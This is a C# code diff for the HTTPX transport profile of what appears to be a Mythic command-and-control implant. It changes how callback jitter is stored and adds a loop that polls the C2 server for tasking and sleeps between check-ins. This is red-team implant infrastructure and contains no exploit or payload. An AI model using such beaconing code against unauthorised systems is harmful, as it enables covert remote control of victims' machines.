@@ -36,7 +36,7 @@ namespace HttpxTransport
         
         // Add thread-safe properties for runtime sleep/jitter changes
         private volatile int _currentSleepInterval;
-        private volatile double _currentJitter;
+        private volatile int _currentJitterInt; // Store as int to avoid volatile double issue
         
         // Add missing features
         private string ProxyHost;
@@ -67,7 +67,7 @@ namespace HttpxTransport
             
             // Initialize runtime-changeable values
             _currentSleepInterval = CallbackInterval;
-            _currentJitter = CallbackJitter;
+            _currentJitterInt = (int)(CallbackJitter * 100); // Store as int (multiply by 100)
 
             // Load httpx configuration
             LoadHttpxConfig(GetValueOrDefault(data, "raw_c2_config", ""));
@@ -330,7 +330,7 @@ namespace HttpxTransport
         {
             // Use runtime-changeable values instead of static ones
             int sleepInterval = _currentSleepInterval;
-            double jitter = _currentJitter;
+            double jitter = _currentJitterInt / 100.0; // Convert back to double
             
             if (jitter > 0)
             {
@@ -352,7 +352,7 @@ namespace HttpxTransport
             }
             if (jitter >= 0)
             {
-                _currentJitter = jitter;
+                _currentJitterInt = (int)(jitter * 100); // Store as int
             }
         }
 
@@ -360,5 +360,30 @@ namespace HttpxTransport
         {
             Connected = connected;
         }
+
+        // IC2Profile interface implementations
+        public void Start()
+        {
+            bool first = true;
+            while(Agent.IsAlive())
+            {
+                bool bRet = GetTasking(resp => Agent.GetTaskManager().ProcessMessageResponse(resp));
+
+                if (!bRet)
+                {
+                    break;
+                }
+
+                Agent.Sleep();
+            }
+        }
+
+        private bool GetTasking(OnResponse<MessageResponse> onResp) => Agent.GetTaskManager().CreateTaskingMessage(msg => SendRecv(msg, onResp));
+        
+        public bool IsOneWay() => false;
+
+        public bool Send<T>(T message) => throw new Exception("HttpxProfile does not support Send only.");
+        
+        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp) => throw new NotImplementedException("HttpxProfile does not support Recv only.");
     }
 }
